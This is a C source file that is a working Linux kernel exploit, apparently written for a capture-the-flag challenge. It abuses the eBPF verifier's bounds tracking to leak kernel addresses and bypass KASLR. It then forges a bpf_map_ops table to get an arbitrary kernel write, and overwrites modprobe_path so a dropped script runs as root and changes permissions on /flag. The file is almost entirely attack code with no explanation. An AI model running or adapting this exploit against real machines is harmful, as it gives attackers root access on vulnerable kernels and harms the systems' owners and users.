#define _GNU_SOURCE
#include <stdio.h>       
#include <stdlib.h>      
#include <unistd.h>      
#include <fcntl.h>       
#include <stdint.h>      
#include <string.h>      
#include <sys/ioctl.h>   
#include <sys/syscall.h> 
#include <sys/socket.h>  
#include <errno.h>       
#include "linux/bpf.h"   
#include "bpf_insn.h"    

int ctrlmapfd, expmapfd;
int progfd;
int sockets[2];
#define LOG_BUF_SIZE 65535
char bpf_log_buf[LOG_BUF_SIZE];

void gen_fake_elf(){
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/chmod"); 
    system("chmod +x /tmp/chmod");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake");
    system("chmod +x /tmp/fake");
}
void init(){
    setbuf(stdin,0);
    setbuf(stdout,0);
    gen_fake_elf();
}
void x64dump(char *buf,uint32_t num){         
    uint64_t *buf64 =  (uint64_t *)buf;       
    printf("[-x64dump-] start : \n");         
    for(int i=0;i<num;i++){                   
            if(i%2==0 && i!=0){                   
                printf("\n");                     
            }                                     
            printf("0x%016lx ",*(buf64+i));       
        }                                         
    printf("\n[-x64dump-] end ... \n");       
}                                             
void loglx(char *tag,uint64_t num){         
    printf("[lx] ");                        
    printf(" %-20s ",tag);                  
    printf(": %-#16lx\n",num);              
}                                           

static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version);      
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries);                                                 
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags);
static int bpf_lookup_elem(int fd,void *key, void *value);
static void writemsg(void);
static void __exit(char *err);

struct bpf_insn insns[]={

    BPF_LD_MAP_FD(BPF_REG_1,3),

    BPF_ALU64_IMM(BPF_MOV,6,0),
    BPF_STX_MEM(BPF_DW,10,6,-8),
    BPF_MOV64_REG(7,10),
    BPF_ALU64_IMM(BPF_ADD,7,-8),
    BPF_MOV64_REG(2,7),
    BPF_RAW_INSN(BPF_JMP|BPF_CALL,0,0,0,
            BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE,0,0,1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(9,0),
    //2
    BPF_LDX_MEM(BPF_DW,6,9,0),
    // offset

    
    /*// BPF_JGE 看 tnum  umin 1*/
    BPF_ALU64_IMM(BPF_MOV,0,0),

    BPF_JMP_IMM(BPF_JGE,6,1,1),
    BPF_EXIT_INSN(),

    BPF_MOV64_IMM(8,0x1),
    BPF_ALU64_IMM(BPF_LSH,8,32),
    BPF_ALU64_IMM(BPF_ADD,8,1),
     /*BPF_JLE 看 tnum  umax 0x100000001*/
    BPF_JMP_REG(BPF_JLE,6,8,1),
    BPF_EXIT_INSN(),


    /*//  JMP32  看 offset*/
    BPF_JMP32_IMM(BPF_JNE,6,5,1),
    BPF_EXIT_INSN(),

    BPF_ALU64_IMM(BPF_AND, 6, 2),
    BPF_ALU64_IMM(BPF_RSH, 6, 1),

    //r6 == offset
    //r9 = inmap
    /*BPF_ALU64_REG(BPF_MUL, 6, 7),*/

    BPF_ALU64_IMM(BPF_MUL,6,0x110),

    // outmap
    BPF_LD_MAP_FD(BPF_REG_1,4),

    BPF_ALU64_IMM(BPF_MOV,8,0),
    BPF_STX_MEM(BPF_DW,10,8,-8),

    BPF_MOV64_REG(7,10),
    BPF_ALU64_IMM(BPF_ADD,7,-8),
    BPF_MOV64_REG(2,7),
    BPF_RAW_INSN(BPF_JMP|BPF_CALL,0,0,0,
            BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE,0,0,1),
    BPF_EXIT_INSN(),

    BPF_MOV64_REG(7,0),

    BPF_ALU64_REG(BPF_SUB,7,6),

    BPF_LDX_MEM(BPF_DW,8,7,0),
    /*// inmap[2] == map_addr*/
    BPF_STX_MEM(BPF_DW,9,8,0x10),
    BPF_MOV64_REG(2,8),

    BPF_LDX_MEM(BPF_DW,8,7,0xc0),
    BPF_STX_MEM(BPF_DW,9,8,0x18),

    BPF_STX_MEM(BPF_DW,7,8,0x40),
    BPF_ALU64_IMM(BPF_ADD,8,0x50),



    BPF_LDX_MEM(BPF_DW,2,9,0x8),
    BPF_JMP_IMM(BPF_JNE,2,1,4),
    BPF_STX_MEM(BPF_DW,7,8,0), //ops
    BPF_ST_MEM(BPF_W,7,0x18,BPF_MAP_TYPE_STACK),//map type
    BPF_ST_MEM(BPF_W,7,0x24,-1),// max_entries
    BPF_ST_MEM(BPF_W,7,0x2c,0x0), //lock_off




    BPF_ALU64_IMM(BPF_MOV,0,0),
    BPF_EXIT_INSN(),
};

void  prep(){
    ctrlmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,0x1);
    if(ctrlmapfd<0){ __exit(strerror(errno));}
    expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x2000,0x1);
    if(expmapfd<0){ __exit(strerror(errno));}
    printf("ctrlmapfd: %d,  expmapfd: %d \n",ctrlmapfd,expmapfd);


    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
            insns, sizeof(insns), "GPL", 0);  
    if(progfd < 0){ __exit(strerror(errno));}

    if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
        __exit(strerror(errno));
    }
    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){ 
        __exit(strerror(errno));
    }
}

void pwn(){
    printf("pwning...\n");
    uint32_t key = 0x0;
    char *ctrlbuf = malloc(0x100);
    char *expbuf  = malloc(0x3000);

    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    uint64_t *expbuf64  = (uint64_t *)expbuf;

    memset(ctrlbuf,'A',0x100);
    for(int i=0;i<0x2000/8;i++){
        expbuf64[i] = i+1;
    }

    ctrlbuf64[0]=0x2;
    ctrlbuf64[1]=0x0;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    bpf_update_elem(expmapfd,&key,expbuf,0);
    writemsg();
    // leak
    memset(ctrlbuf,0,0x100);
    bpf_lookup_elem(ctrlmapfd,&key,ctrlbuf);
    x64dump(ctrlbuf,8);
    bpf_lookup_elem(expmapfd,&key,expbuf);
    x64dump(expbuf,8);
    uint64_t map_leak = ctrlbuf64[2];
    uint64_t elem_leak = ctrlbuf64[3]-0xc0+0x110;
    uint64_t kaslr = map_leak - 0xffffffff82016340;
    uint64_t modprobe_path = 0xffffffff82446d80 + kaslr;
    loglx("map_leak",map_leak);
    loglx("elem_leak",elem_leak);
    loglx("kaslr",kaslr);
    loglx("modprobe",modprobe_path);

    getchar();
    uint64_t fake_map_ops[]={
        kaslr +0xffffffff8116ec70,
        kaslr +0xffffffff8116fa00,
        0x0,
        kaslr +0xffffffff8116f2d0,
        kaslr +0xffffffff8116ed50,//get net key 5
        0x0,
        0x0,
        kaslr +0xffffffff81159b30,
        0x0,
        kaslr +0xffffffff81159930,
        0x0,
        kaslr +0xffffffff8116edd0,
        kaslr +0xffffffff8116f1c0,
        kaslr +0xffffffff8116ed80,
        kaslr +0xffffffff8116ed50,//map_push_elem 15
        0x0,
        0x0,
        0x0,
        0x0,
        kaslr +0xffffffff8116f050,
        0x0,
        kaslr +0xffffffff8116ee80,
        kaslr +0xffffffff8116f870,
        0x0,
        0x0,
        0x0,
        kaslr +0xffffffff8116ece0,
        kaslr +0xffffffff8116ed10,
        kaslr +0xffffffff8116ee50,
    };

    // overwrite bpf_map_ops
    memcpy(expbuf,(void *)fake_map_ops,sizeof(fake_map_ops));
    bpf_update_elem(expmapfd,&key,expbuf,0);


    //overwrite modeprobe path
    ctrlbuf64[0]=0x2;
    ctrlbuf64[1]=0x1;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    writemsg();

    expbuf64[0] = 0x706d742f -1;
    bpf_update_elem(expmapfd,&key,expbuf,modprobe_path);
    expbuf64[0] = 0x6d68632f -1;
    bpf_update_elem(expmapfd,&key,expbuf,modprobe_path+4);
    expbuf64[0] = 0x646f -1;
    bpf_update_elem(expmapfd,&key,expbuf,modprobe_path+8);
}





int main(int argc,char **argv){
    init();
    prep();
    pwn();
    return 0;
}


static void __exit(char *err) {              
    fprintf(stderr, "error: %s\n", err); 
    exit(-1);                            
}                                            
static void writemsg(void) {                                     
    char buffer[64];                                         
    ssize_t n = write(sockets[0], buffer, sizeof(buffer));   
}                                                                


static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version){

    union bpf_attr attr = {                                        
        .prog_type = prog_type,                                
        .insns = (uint64_t)insns,                              
        .insn_cnt = prog_len / sizeof(struct bpf_insn),        
        .license = (uint64_t)license,                          
        .log_buf = (uint64_t)bpf_log_buf,                      
        .log_size = LOG_BUF_SIZE,                              
        .log_level = 1,                                        
    };                                                             
    attr.kern_version = kern_version;                              
    bpf_log_buf[0] = 0;                                            
    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));  

}
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries){

    union bpf_attr attr = {                                         
        .map_type = map_type,                                   
        .key_size = key_size,                                   
        .value_size = value_size,                               
        .max_entries = max_entries                              
    };                                                              
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));  

}                                                
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
        .flags = flags,                                              
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));  

}
static int bpf_lookup_elem(int fd,void *key, void *value){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));  
}
